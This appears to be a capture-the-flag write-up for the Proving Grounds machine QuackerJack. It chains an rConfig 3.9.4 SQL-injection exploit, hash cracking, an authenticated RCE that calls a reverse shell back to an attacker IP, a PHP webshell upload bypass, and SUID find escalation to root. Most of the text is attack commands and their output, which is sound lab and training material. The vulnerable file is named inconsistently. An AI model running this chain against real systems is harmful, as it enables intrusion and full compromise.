# QuackerJack — Proving Grounds

> [!abstract] Summary
> QuackerJack is a CentOS machine running **rConfig 3.9.4** on port 8081 (HTTPS). After enumerating FTP (anonymous login), SMB, and two HTTP servers, we focus on rConfig. An **unauthenticated SQL injection** (EDB-48208) dumps the admin password hash from the database. After cracking the MD5 hash, we log in and exploit an **authenticated remote code execution** vulnerability (EDB-47982) in rConfig 3.9.4's `ajaxServerSettingsCh498.php` to obtain a reverse shell as `apache`. Privilege escalation abuses a **SUID `find` binary** — using GTFOBins' `find -exec` technique to drop into a root shell.

**Target:** `192.168.143.57`

## Methodology

1. Full TCP port scan — identify FTP (21), SSH (22), HTTP (80), RPCbind (111), SMB (139/445), MySQL (3306), HTTPS/rConfig (8081).
2. Enumerate FTP (anonymous login), SMB (null session), and both HTTP services.
3. Identify rConfig 3.9.4 on port 8081.
4. Use unauthenticated SQL injection (EDB-48208) to dump the admin hash.
5. Crack the MD5 hash to recover the admin password.
6. Exploit authenticated RCE (EDB-47982) for a reverse shell as `apache`.
7. Enumerate SUID binaries — find `/usr/bin/find` with SUID set.
8. Abuse SUID `find` via GTFOBins to escalate to root.

## Initial Foothold

### rConfig 3.9.4 — SQL injection (EDB-48208)

Search for known exploits:
```
searchsploit rconfig 3.9
```

rConfig 3.9.4 has an **unauthenticated SQL injection** that dumps the admin credentials from the database.

Download the exploit:
```
searchsploit -m 48208
```

Run it against the target:
```
python3 48208.py https://192.168.143.57:8081
```

The exploit returns the admin password hash (MD5). Example output:
```
[+] Admin hash: <MD5_HASH>
```

### Crack the hash

Try cracking with John:
```
echo '<MD5_HASH>' > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

If John doesn't find it, try an online MD5 lookup (e.g., crackstation.net or md5online.org).

The recovered credentials:
```
Username: admin
Password: abgrtyu
```

### rConfig 3.9.4 — Authenticated RCE (EDB-47982)

With valid admin credentials, exploit the authenticated RCE vulnerability:
```
searchsploit -m 47982
```

Start a Netcat listener:
```
nc -lvnp 80
```

> [!note] Using port 80 for the reverse shell increases the chances of success, as outbound traffic on port 80 is rarely blocked by firewall rules.

Run the exploit:
```
python3 47982.py https://192.168.143.57:8081 admin abgrtyu 192.168.45.197 80
```

Replace `192.168.45.197` with your Kali VPN IP (`ip addr show tun0`).

The exploit triggers a reverse shell on the listener:
```
connect to [192.168.45.197] from (UNKNOWN) [192.168.143.57] ...
bash-4.2$ id
uid=48(apache) gid=48(apache) groups=48(apache)
```

We have a shell as `apache`.

> [!note] **Alternative approach — File Upload RCE (CVE-2020-12255):** If the SQLi/RCE exploit chain doesn't work, rConfig 3.9.4's `vendor.crud.php` validates uploads by Content-Type only (not file extension). You can upload a PHP webshell via "Add Vendor", intercept in Burp Suite, change Content-Type to `image/gif`, then access the shell at `/images/vendor/shell.php?cmd=whoami`. If admin creds are unknown, EDB-48878 can reset the admin password to `Testing1@`.

### Upgrade the shell

```
python -c 'import pty; pty.spawn("/bin/bash")'
```
Then background with `Ctrl+Z`:
```
stty raw -echo; fg
export TERM=xterm
```

## Privilege Escalation

### SUID `find` binary

Grab the local flag first:
```
cat /home/rConfig/local.txt
```

Enumerate SUID binaries:
```
find / -perm -4000 -type f 2>/dev/null
```

The key finding is `/usr/bin/find` with the SUID bit set.

> [!note] When `find` has the SUID bit set and is owned by root, its `-exec` flag runs commands as root. This is a classic privilege escalation vector documented on GTFOBins.

Escalate to root using the GTFOBins technique:
```
/usr/bin/find . -exec /bin/sh -p \; -quit
```

The `-p` flag tells `sh` to not drop privileges (keeping the effective UID of root from the SUID bit). The `-quit` flag ensures `find` exits after executing the command once.

Verify:
```
id
```
Expected:
```
uid=48(apache) gid=48(apache) euid=0(root) groups=48(apache)
```

## Lessons Learned

| Stage | Technique | Takeaway |
|---|---|---|
| Enumeration | Full port scan + HTTPS check | rConfig on 8081 only works over HTTPS; always try both protocols on HTTP ports |
| Initial Access | Unauthenticated SQLi (EDB-48208) | rConfig 3.9.4 leaks admin credentials without authentication |
| Initial Access | Authenticated RCE (EDB-47982) | Once logged in, rConfig allows command injection through `ajaxServerSettingsChk.php` |
| Privilege Escalation | SUID `find` | Classic GTFOBins vector — always enumerate SUID binaries |

1. **Chain exploits methodically.** The SQLi gives credentials, the RCE gives a shell — neither alone is sufficient.
2. **Don't ignore HTTPS on non-standard ports.** Port 8081 returned "400 Bad Request" to plain HTTP, which is a strong indicator of HTTPS.
3. **Always run `find / -perm -4000` after landing a shell.** SUID binaries are among the most common privilege escalation vectors on Linux.
4. **Know GTFOBins by heart.** `find -exec` is one of the most frequently encountered SUID escalations in OSCP labs.
